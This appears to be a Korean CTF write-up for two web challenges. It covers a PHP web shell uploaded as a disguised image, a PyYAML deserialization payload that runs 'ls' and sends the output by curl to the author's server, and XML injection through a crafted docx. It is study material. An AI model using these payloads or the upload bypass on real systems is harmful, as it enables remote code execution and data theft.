[Web] Indead v1

누가 봐도 파일 업로드를 통해 웹 쉘을 띄우라는 문제이다.

그렇지만, 일반적으로 php 확장자를 쓰거나 php type을 가지는 파일은 업로드할 수 없고 오직

“이미지 파일(jpg, png, gif)” 만 업로드가 가능했다.

이는 문제 유형에 따라 단순 우회가 될 수 있고 조금 thinking을 해야 하는 경우도 있는데

단순 우회라고 하면은 filename extension 첫 번째 값만 검사를 한다거나, content-type 변조만으로

우회 케이스가 발생하는 그런 경우를 말한다.

하지만 이 문제는 후자로 thinking을 조금 해야 하는 문제였지만, 그렇게 어렵진 않다.

php 웹 쉘을 만들고 나서 file signature 부분을 image로 인식할 수 있게 교묘하게 우회하면 된다.

이렇게 웹 쉘을 업로드하고 나면, 경로를 찾아야 하는데 마침 업로드가 된 파일(이미지)를 홈페이지 내에

불러와서 출력하는 기능이 있다. 해당 경로값을 따서 들어가면 된다.

플래그는 /var/www/flag.txt 에 있다고 하니 경로 내 파일을 읽어주면 된다.

?cmd=cat /var/www/flag.txt

https://velog.io/@bloomspes/yaml-파일-작성-요령-기초편-스프링편

여기서 yaml 문법을 입력하면 결과적으로 json 문법으로 반환되어 출력되는데 이 과정에서 힌트를 얻을 수

있었다. 패킷을 잡아보면 preimum이라는 매개변수가 세팅되어 날아가는데 이 값을 1로 고치면 PyYAML 이라는

스폐셜(?) 프리미엄 기능을 사용할 수 있다고 한다. 그래서 PyYAML Deserialization 을 통한 Exploit이 가능

할 것이라고 판단하고 아래와 같은 페이로드를 통해 내 서버로 output이 날아오게끔 세팅했다.

!!python/object/apply:os.system ["curl http://myip/?`ls`"]

그랬더니 정상적으로 출력값이 날아오길래, “/tmp/flag.txt” 에 플래그 파일이 있다는 설명을 보고 바로

읽어서 문제를 풀이했다.

[Web] Indead v2

이번 문제는 v1에 이어서 v2로 나온 문제이다. 같은 방법으로 파일 업로드를 하는 문제였지만 웹 쉘을 통한 문제는

아니였다. 아래 사진과 같이 docx를 통해 내용을 입력하고 업로드 해보면 파일 안에 있는 문자를 파싱해서

그 문자만 출력해주는 구조를 띄고있었다.

생각을 좀 해보니, XML 문서를 업로드해서 Injection 할 수 있지 않을까 라는 방법이 떠올랐고 실천했다.

하지만 일단 docx 확장자만을 허용하니 docx로 위장할 수 있는 방법이 먼저 필요했다.

그에 대한 해답은 python-docx 모듈을 사용해서 위장하는 방법이다.

  • https://pypi.org/project/python-docx/

이 모듈을 사용하면 하나의 문서(Document) 파일 생성이 가능한데 그 안에 포함된 xml 문서를 변조하여

업로드하면 XML Injecton과 같은 효과를 볼 수 있다.

우선 아래 Document를 생성하는 코드이다 (create.py)

#!/usr/bin/python3

from docx import Document

document = Document()
paragraph = document.add_paragraph('hi')
document.save('exploit.docx')

코드를 실행하고 폴더에 보면 exploit.docx가 생겼을 것이다 이를 unzip으로 압축 해제하면 여러 xml

파일이 나오는데 document.xml 파일을 target으로 injection 구문을 만들어주자.

대충 이렇게 만들어주면 된다. 아까 paragraph로 만들어준 hi 부분을 출력부분으로 만들어주면 된다.

그리고 나서 다시 docx로 압축해서 파일을 업로드하면 된다.

flag{XML_is_ancestor_0f_every7hing_do_you_agree_?}
